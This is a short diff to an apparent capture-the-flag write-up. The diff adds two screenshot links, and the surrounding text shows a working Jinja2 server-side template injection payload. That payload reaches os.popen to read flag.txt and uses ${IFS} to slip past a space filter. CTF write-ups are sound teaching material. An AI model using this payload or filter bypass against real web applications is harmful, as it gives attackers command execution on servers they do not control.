@@ -14,6 +14,8 @@ Payload:
 
 Output:
 
+![image](https://user-images.githubusercontent.com/58823465/159277284-d883ed26-f4ab-45a8-a29d-9ce0cdd83644.png)
+
 
 We can simply bypass this with ${IFS}:
 
@@ -22,6 +24,8 @@ Final payload:
 ```` /submit?name={{config.__class__.__init__.__globals__[%27os%27].popen("cat${IFS}flag.txt").read()}}  ````
 
 Output:
+
+![image](https://user-images.githubusercontent.com/58823465/159277454-bc977a5e-0249-4c27-b968-82bf46f1e719.png)
 
 
 And there's the flag
